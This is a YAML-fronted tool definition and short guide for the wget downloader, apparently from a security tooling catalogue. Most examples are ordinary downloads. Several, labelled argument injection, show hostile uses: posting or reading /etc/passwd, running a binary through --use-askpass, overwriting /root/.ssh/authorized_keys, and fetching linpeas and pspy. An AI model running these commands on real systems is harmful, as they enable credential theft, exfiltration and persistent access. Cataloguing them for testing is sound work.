---
id: network-http-wget
namespace: network:http:wget
name: wget
description: Non-interactive download utility supporting HTTP, HTTPS, and FTP protocols
  with recursive download and resume capability.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - network.transfer.download
  - network.mirror.site
  - network.transfer.recursive
  - network.transfer.resume
  - network.http.fetch
  - network.transfer.upload
  - security.execution.command
  - system.file.read
  - system.file.write
platforms:
  - linux
  - macos
  - cross-platform
risk_level: low
trust_level: verified
execution_policy: enabled
architectures:
  - amd64
  - arm64
  - cross-platform
dependencies: []
related_tools:
  - aria2c
  - httrack
  - axel
  - curl
  - network-http-curl
artifacts:
  - type: network.transfer.file
    description: File downloaded from a remote server
    trust_level: community
  - type: network.http.response
    description: HTTP response data
    mime: text/plain
    trust_level: verified
workflow_edges:
  produces:
    - downloaded-file
    - mirror-directory
  consumes:
    - url
    - base-url
contract:
  inputs:
    - type: network.target.url
      description: URL to download
  outputs:
    - type: network.transfer.file
      description: Downloaded file written to disk
  side_effects:
    - filesystem_write
    - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 32
    network: medium
    disk_io: medium
resource_profile:
  cpu: low
  memory_mb: 32
  network: medium
  disk_io: medium
allowed-tools:
  - wget
  - Bash
  - execFile
parameters:
  - name: version
    type: string
    required: false
    description: "display the version of Wget and exit"
    aliases:
      - -V
      - --version
  - name: help
    type: string
    required: false
    description: "print this help"
    aliases:
      - -h
      - --help
  - name: background
    type: string
    required: false
    description: "go to background after startup"
    aliases:
      - -b
      - --background
  - name: execute
    type: string
    required: false
    description: "execute a `.wgetrc'-style command"
    aliases:
      - -e
      - --execute
  - name: output-file
    type: file
    required: false
    description: "log messages to FILE"
    aliases:
      - -o
      - --output-file
  - name: append-output
    type: file
    required: false
    description: "append messages to FILE"
    aliases:
      - -a
      - --append-output
  - name: debug
    type: string
    required: false
    description: "print lots of debugging information"
    aliases:
      - -d
      - --debug
  - name: quiet
    type: string
    required: false
    description: "quiet (no output)"
    aliases:
      - -q
      - --quiet
  - name: verbose
    type: string
    required: false
    description: "be verbose (this is the default)"
    aliases:
      - -v
      - --verbose
  - name: no-verbose
    type: string
    required: false
    description: "turn off verboseness, without being quiet"
    aliases:
      - -n
      - --no-verbose
  - name: report-speed
    type: string
    required: false
    description: "output bandwidth as TYPE. TYPE can be bits"
    aliases:
      - --report-speed
  - name: input-file
    type: file
    required: false
    description: "download URLs found in local or external FILE"
    aliases:
      - -i
      - --input-file
  - name: force-html
    type: file
    required: false
    description: "treat input file as HTML"
    aliases:
      - -F
      - --force-html
  - name: base
    type: url
    required: false
    description: "resolves HTML input-file links (-i -F)"
    aliases:
      - -B
      - --base
  - name: config
    type: file
    required: false
    description: "specify config file to use"
    aliases:
      - --config
  - name: no-config
    type: string
    required: false
    description: "do not read any config file"
    aliases:
      - --no-config
  - name: rejected-log
    type: file
    required: false
    description: "log reasons for URL rejection to FILE"
    aliases:
      - --rejected-log
  - name: tries
    type: integer
    required: false
    description: "set number of retries to NUMBER (0 unlimits)"
    aliases:
      - -t
      - --tries
  - name: retry-connrefused
    type: string
    required: false
    description: "retry even if connection is refused"
    aliases:
      - --retry-connrefused
  - name: retry-on-host-error
    type: string
    required: false
    description: "consider host errors as non-fatal, transient errors"
    aliases:
      - --retry-on-host-error
  - name: retry-on-http-error
    type: url
    required: false
    description: "comma-separated list of HTTP errors to retry"
    aliases:
      - --retry-on-http-error
  - name: output-document
    type: file
    required: false
    description: "write documents to FILE"
    aliases:
      - -O
      - --output-document
  - name: no-clobber
    type: string
    required: false
    description: "skip downloads that would download to"
    aliases:
      - -n
      - --no-clobber
  - name: no-netrc
    type: string
    required: false
    description: "don't try to obtain credentials from .netrc"
    aliases:
      - --no-netrc
  - name: continue
    type: string
    required: false
    description: "resume getting a partially-downloaded file"
    aliases:
      - -c
      - --continue
  - name: start-pos
    type: string
    required: false
    description: "start downloading from zero-based position OFFSET"
    aliases:
      - --start-pos
  - name: progress
    type: string
    required: false
    description: "select progress gauge type"
    aliases:
      - --progress
  - name: show-progress
    type: string
    required: false
    description: "display the progress bar in any verbosity mode"
    aliases:
      - --show-progress
  - name: timestamping
    type: string
    required: false
    description: "don't re-retrieve files unless newer than"
    aliases:
      - -N
      - --timestamping
  - name: no-if-modified-since
    type: string
    required: false
    description: "don't use conditional if-modified-since get"
    aliases:
      - --no-if-modified-since
execution:
  template: "wget {version} {help} {background} {execute} {output-file}"
  sandbox: execFile
  timeout_seconds: 300
  shell: false
global_vars:
  target: ip
  port: port
examples:
  - description: "Download a single file"
    command: "wget https://example.com/file.zip"
  - description: "Download with custom filename"
    command: "wget -O output.zip https://example.com/file.zip"
  - description: "Resume an interrupted download"
    command: "wget -c https://example.com/largefile.iso"
  - description: "Recursively download a website"
    command: "wget -r -l 2 -np https://example.com/docs/"
  - description: "Mirror an entire site"
    command: "wget -m -k https://docs.example.com/"
  - description: Can be used to execute any command or file on a system, but without
      any arguments, and without stdout/stderr. This can be useful if you are able
      to write an executable to the server beforehand. The example here invokes /sbin/reboot.
    command: "wget --use-askpass=/sbin/reboot http://0/\n"
  - description: Send a local file to a remote server in a POST request. Note that
      the file will be sent as-is.
    command: "wget --post-file=/etc/passwd http://0/\n"
  - description: Read local files by importing the file as URIs to be retrieved. The
      content of the file will be displayed as error messages.
    command: "wget --input-file=/etc/passwd http://0/\n"
  - description: Reads local data and writes the output to a file. This is only suitable
      for displaying non-binary files, as the output is an error-log.
    command: "wget --input-file=/etc/passwd --output-file=/tmp/passwd.txt\n"
  - description: Downloads a remote file via an HTTP GET request and saves it to a
      specific location.
    command: "wget --output-document=/root/.ssh/authorized_keys http://0/\n"
  - description: 'Argument injection: execute arbitrary command: Can be used to execute
      any command or file on a system, but without any arguments, and without stdout/stderr.
      This can be useful if you are able to write an executable to the server beforehand.
      The example here invokes /sbin/reboot.'
    command: wget --use-askpass=/sbin/reboot http://0/
  - description: 'Argument injection: upload file: Send a local file to a remote server
      in a POST request. Note that the file will be sent as-is.'
    command: wget --post-file=/etc/passwd http://0/
  - description: 'Argument injection: read local file: Read local files by importing
      the file as URIs to be retrieved. The content of the file will be displayed
      as error messages.'
    command: wget --input-file=/etc/passwd http://0/
  - description: 'Argument injection: write to local file: Reads local data and writes
      the output to a file. This is only suitable for displaying non-binary files,
      as the output is an error-log.'
    command: wget --input-file=/etc/passwd --output-file=/tmp/passwd.txt
  - description: 'Argument injection: download file: Downloads a remote file via an
      HTTP GET request and saves it to a specific location.'
    command: wget --output-document=/root/.ssh/authorized_keys http://0/
  - description: NetRunners usefull/shell
    command: wget {{URL}}/pspy
  - description: NetRunners usefull/shell
    command: wget {{URL}}/linpeas.sh
  - description: Download a file from a given URL and save it in the current directory
    command: wget http://example.com/file.zip
  - description: Download a file and save it with a different name
    command: wget -O newname.zip http://example.com/file.zip
  - description: Download files in the background
    command: wget -b http://example.com/file.zip
  - description: Download a file and limit the download speed to reduce bandwidth
      usage
    command: wget --limit-rate=200k http://example.com/file.zip
  - description: Download files from a list of URLs provided in a text file
    command: wget -i urls.txt
  - description: Resume an incomplete download
    command: wget -c http://example.com/file.zip
  - description: Download a file while showing the progress in a more readable form
    command: wget --show-progress http://example.com/file.zip
  - description: Download a file without checking the server's SSL certificate
    command: wget --no-check-certificate https://example.com/file.zip
  - description: Download an entire website for offline browsing
    command: wget --mirror --convert-links --adjust-extension --page-requisites --no-parent
      http://example.com
  - description: Download a file with HTTP authentication
    command: wget --user=username --password=password http://example.com/secure-file.zip
  - description: Download a file with cookies, useful for sites that require logins
    command: wget --load-cookies cookies.txt http://example.com/file.zip
  - description: Download a directory from an FTP server
    command: wget -r ftp://example.com/pub/
  - description: Download only files newer than the local version
    command: wget -N http://example.com/file.zip
  - description: Download a file only if it has been updated on the server
    command: wget -S --spider http://example.com/file.zip
  - description: Quietly download a file, continuing where it left of, if the connection
      fails. The file will be downloaded to the current working directory.
    command: wget -qc http://example.com/file.zip
  - description: Specify a location to download the given file.
    command: wget -qcO [PATH] http://example.com/file.zip
  - description: Download URL using the user agent string provided to the `-U` flag.
    command: wget -U 'Mozilla/5.0' http://example.com/file.zip
references:
  - label: "GNU Wget documentation"
    url: "https://www.gnu.org/software/wget/manual/"
  - label: "Wget for beginners"
    url: "https://linux.die.net/man/1/wget"
features:
  - file-system
  - output-json
  - network-intensive
  - process-manip
techniques:
  - command-and-control
  - execution
  - credential-access
  - collection
  - data-manipulation
  - exfiltration
install:
    - method: apt
      package_name: "wget"
      commands:
        - "apt-get install -y wget"
    - method: brew
      package_name: "wget"
      commands:
        - "brew install wget"
---

# Wget — Non-Interactive Download Utility

Wget is a free utility for non-interactive download of files from the web. It supports HTTP, HTTPS, and FTP protocols, and is particularly suited for reliable downloading in scripts and automated workflows.

## Key Features

| Feature | Description |
|---------|-------------|
| **Resume** | Continue interrupted downloads with `-c` |
| **Recursive** | Follow links recursively with `-r` |
| **Mirror** | Download entire websites for offline viewing |
| **Robust** | Retry on failure, adaptive bandwidth, timestamping |

## Recursive Download

```bash
# Download a directory structure
wget -r -np -nH --cut-dirs=1 https://example.com/files/

# Download with file type filtering
wget -r -A.pdf https://example.com/documents/

# Avoid downloading specific types
wget -r -R.jpg,.png,.gif https://example.com/
```

## Rate Limiting

```bash
# Limit download speed
wget --limit-rate=200k https://example.com/largefile.iso

# Set retry and wait intervals
wget --tries=10 --wait=5 https://example.com/
```

## Authentication

```bash
# HTTP Basic Auth
wget --user=username --password=password https://example.com/private/

# Using .netrc file
echo "machine example.com login user password pass" > ~/.netrc
wget https://example.com/private/
```

## Related Tools

- **[curl](../http/curl.md)** — More protocol support, stdout-oriented
- **[axel](../../transfer/axel.md)** — Accelerated download with multiple connections
- **[aria2c](../../transfer/aria2c.md)** — Multi-protocol, multi-connection downloader
- **[httrack](../../mirror/httrack.md)** — Full website mirroring tool
